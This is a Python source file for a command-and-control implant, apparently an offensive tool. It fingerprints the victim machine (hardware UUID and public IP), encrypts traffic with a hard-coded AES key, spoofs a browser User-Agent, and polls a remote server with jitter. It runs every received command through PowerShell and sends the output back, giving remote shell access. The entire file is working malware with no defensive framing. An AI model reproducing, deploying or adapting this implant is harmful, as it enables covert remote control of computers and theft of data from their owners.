
import requests
import json
import base64
import subprocess
import time
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

jitters = random.randint(1 , 3) #  jitters
SERVER_URL = 'http://192.168.1.5/ntfy/'  # Replace with your server URL
UAG = 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'  # Replace with your User-Agent

# Encryption parameters
KEY = b'123456789012345678901234r0hollah'
IV = b'&9*zS7LY%ZN1thfI'

def get_public_ip():
    response = requests.get('https://ident.me', headers={'User-Agent': UAG})
    return response.text

def get_system_info():
    

    
    system_info = {
        'uuid': str(run_command("(Get-CimInstance -Class Win32_ComputerSystemProduct).UUID")),
        'public_ip': get_public_ip(),
        'info':""
    }
    return system_info

def encrypt_string(input_str: str) -> str:
    input_bytes = input_str.encode('utf-8')
    key = b'123456789012345678901234r0hollah'
    iv = b'&9*zS7LY%ZN1thfI'

    # Create AES cipher
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Pad input_bytes to be multiple of block size (128 bits = 16 bytes)
    padding_length = 16 - (len(input_bytes) % 16)
    input_bytes += bytes([padding_length]) * padding_length

    # Encrypt the data
    encrypted_bytes = encryptor.update(input_bytes) + encryptor.finalize()

    # Encode to base64
    output = base64.b64encode(encrypted_bytes).decode('utf-8')
    return output



def decrypt_string(input_str: str) -> str:
    # Decode the input string from Base64
    data = base64.b64decode(input_str)
    iv = b'&9*zS7LY%ZN1thfI'
    key = b'123456789012345678901234r0hollah'

    # Create AES cipher
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_bytes = decryptor.update(data) + decryptor.finalize()

    # Unpad the decrypted bytes
    padding_length = decrypted_bytes[-1]
    decrypted_bytes = decrypted_bytes[:-padding_length]

    # Decode to string using UTF-8
    result_str = decrypted_bytes.decode('utf-8')
    return result_str


def run_command(input_str):    
    if input_str.lower() == 'terminate':
        exit()
    process = subprocess.Popen(["powershell", "-Command", input_str], 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE,
                            text=True)
    stdout, stderr = process.communicate()
    if stdout:
        return stdout
    else:
        return stderr
        
def main():
    while True:
        system_info = get_system_info()
        json_data = json.dumps(system_info)
        encrypted_data = encrypt_string(json_data)

        params = {
            'DATA': encrypted_data,
            'new_user': 'ok'
        }

        requests.post(SERVER_URL, data=params, headers={'User-Agent': UAG})

        while True:
            
            time.sleep(jitters)
            
            system_info = {'uuid': system_info['uuid']}
            json_data = json.dumps(system_info)
            encrypted_data = encrypt_string(json_data)
            
            params = {'DATA': encrypted_data}
            
            result = requests.post(SERVER_URL, data=params, headers={'User-Agent': UAG})
            request_data = decrypt_string(result.text)
            if request_data != 'wait':
                request_json = json.loads(request_data)
                
                cmd = request_json[0]['cmd']
                cmd_uid = request_json[0]['cmd_uid']
                
                run_result = run_command(cmd)    
                response_info = {
                    'uuid': system_info['uuid'],
                    'result': run_result,
                    'cmd_uid': cmd_uid
                }
                
                json_response = json.dumps(response_info)
                encrypted_response = encrypt_string(json_response)
                
                params = {'DATA': encrypted_response}
                requests.post(SERVER_URL, data=params, headers={'User-Agent': UAG})

if __name__ == "__main__":
    main()
